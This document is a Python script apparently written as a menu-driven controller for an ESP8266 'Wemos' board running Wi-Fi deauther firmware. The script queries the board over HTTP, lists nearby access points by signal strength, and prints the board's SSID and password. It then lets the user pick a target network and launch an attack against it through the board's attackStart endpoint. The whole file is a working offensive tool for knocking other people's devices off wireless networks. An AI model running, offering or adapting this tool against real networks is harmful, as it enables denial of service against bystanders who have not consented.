import os, time, requests, json

g = ("\33[0;32m")#Green")
b = ("\33[0;36m")#Blue")
red = ("\33[31;1m")#Red")
y = ("\33[33;1m")#Yellow")
yl = ("\33[1;33m")#YellowLight")
ttp = ("\033[0m")#LightGrey")
underline = ('\033[4;37;48m')

res = requests.Session();
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
}


def main(ip):
    jumlah = []
    os.system("clear")
    res.get("http://"+ip+"/APScan.json", headers=headers).text
    scan = res.get("http://"+ip+"/APScanResults.json", headers=headers).text
    info = json.loads(res.get("http://"+ip+"/settings.json", headers=headers).text)
    for jml in json.loads(scan)['aps']:
        jumlah.append(jml)
    print(g+"  (("+red+"o"+g+"))"+ttp+"    <{ "+b+"Wemos Wifi Attack"+ttp+" }> Version : "+yl+"0.1"+ttp)
    print(ttp+"    |       > Author : "+g+"@Rezadkim (c) 2021"+ttp)
    print("   /_\      > Source : "+g+underline+"http://rezadkim.my.id/"+ttp)
    print("  /___\     > Support By : "+g+"Stefan Kremser & Udin"+ttp)
    print(" /     \ ")
    print(y+"=       ="+ttp)
    print(ttp+"\n[ "+b+"Info Host"+ttp+" ]")
    print(ttp+"["+g+"+"+ttp+"] IP : "+g+ip)
    print(ttp+"["+g+"+"+ttp+"] SSID : "+g+info['ssid'])
    print(ttp+"["+g+"+"+ttp+"] Password : "+g+info['password'])
    print(ttp+"["+g+"+"+ttp+"] MAC : "+g+info['macAp']+"\n")
    for persen in range(101):
        print(ttp+"\r["+b+str(persen)+"%"+ttp+"] Scan for Wi-Fi access points ...", end="")
        time.sleep(0.100)
    print("\n"+ttp+"["+g+"+"+ttp+"] Network Found : "+g+str(len(jumlah))+ttp+"\n")
    for sc in json.loads(scan)['aps']:
        if sc['r'] > -50:
            print(ttp+"["+g+str(sc['i'])+ttp+"] "+sc['ss']+g+" "+str(sc['r'])+ttp+" "+sc['m'])
        elif sc['r'] > -90:
            print(ttp+"["+g+str(sc['i'])+ttp+"] "+sc['ss']+y+" "+str(sc['r'])+ttp+" "+sc['m'])
        elif sc['r'] < -90:
            print(ttp+"["+g+str(sc['i'])+ttp+"] "+sc['ss']+red+" "+str(sc['r'])+ttp+" "+sc['m'])
        else:
            pass
    pilih = int(input(ttp+"\n["+g+"+"+ttp+"] Choose to attack : "+g))
    select = res.get("http://"+ip+"/APSelect.json?num="+str(pilih), headers=headers).text
    if "true" in select:
        print(ttp+"["+g+"+"+ttp+"] SSID Selected : "+g+json.loads(scan)['aps'][pilih]['ss'])
        tanya = input(ttp+"["+g+"?"+ttp+"] Do you want to continue the attack (y/n): "+g)
        if tanya =="y":
            print(ttp+"\n["+b+"%"+ttp+"] Start ...")
            time.sleep(2)
            serang = res.get("http://"+ip+"/attackStart.json?num=0"+str(pilih), headers=headers).text
            if "true" in serang:
                print(ttp+"["+g+"+"+ttp+"] Success attack >_")
                fo = res.get("http://"+ip+"/attackInfo.json", headers=headers).text
                print(ttp+"["+g+"$"+ttp+"] "+json.loads(fo)['attacks'][0]['name']+" "+json.loads(fo)['attacks'][0]['status']+g+" Running ..."+ttp)
                input(ttp+"\n["+b+">>"+ttp+"] Press enter to stop attack and back to menu ...")
                res.get("http://"+ip+"/attackStart.json?num=0"+str(pilih), headers=headers).text
                main(ip)
            else:
                print(ttp+"["+red+"!"+ttp+"] Failed attack :(")
                input(ttp+"\n["+b+">>"+ttp+"] Press enter to stop attack and back to menu ...")
                main(ip)
        else:
            main(ip)
    else:
        print(ttp+"["+red+"!"+ttp+"] Error to select SSID")
        input(ttp+"\n["+b+">>"+ttp+"] Press enter back to menu ...")
        main(ip)

os.system("clear")
print(ttp+"["+red+"!"+ttp+"] insert the usb into wemos before running this program ...")
ipe = input(ttp+"\n["+g+"+"+ttp+"] IP : "+g)  
main(ipe)
